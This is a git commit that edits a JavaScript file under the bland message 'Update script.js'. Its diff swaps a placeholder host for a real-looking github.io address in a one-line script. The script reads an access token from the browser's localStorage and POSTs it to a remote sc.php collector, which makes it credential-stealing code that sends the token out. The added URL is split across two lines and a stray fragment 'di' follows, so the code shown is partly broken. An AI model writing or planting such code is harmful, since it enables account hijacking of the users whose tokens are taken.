e3834098d17eb87d1d7af944c9bc662c720b515e
calvinbarsamian-oss <calvinbarsamian@gmail.com>
2025-12-28 22:47:23 -0800

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,3 @@
-const token = localStorage.getItem('accessToken'); fetch('YOURWEBSITE.com/sc.php',{method: 'POST',headers: {'Content-Type':'application/x-www-form-urlencoded'},body: 'user=' + token});
+const token = localStorage.getItem('accessToken'); fetch('https://calvinbarsamian.github.io
+/sc.php',{method: 'POST',headers: {'Content-Type':'application/x-www-form-urlencoded'},body: 'user=' + token});
 di
